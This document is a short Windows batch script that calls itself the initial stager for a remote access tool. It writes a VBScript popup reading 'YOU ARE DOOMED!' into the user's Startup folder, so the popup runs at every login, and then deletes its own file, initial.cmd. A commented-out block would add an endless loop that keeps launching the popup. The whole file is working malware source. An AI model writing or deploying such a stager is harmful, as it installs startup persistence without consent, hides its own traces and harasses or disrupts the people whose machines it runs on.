@echo off

@rem initial stager for the rat

set InitialPath=%cd%

@rem go to startup
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup


@rem generate payload
(echo MsgBox "YOU ARE DOOMED!" ^& vbCrLf ^& "NOT WORTH IT", vbOkOnly+vbExclamation+vbDefaultButton1, "TITLE")>popup.vbs

@rem move back to saved directory
cd "%InitialPath%"
del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

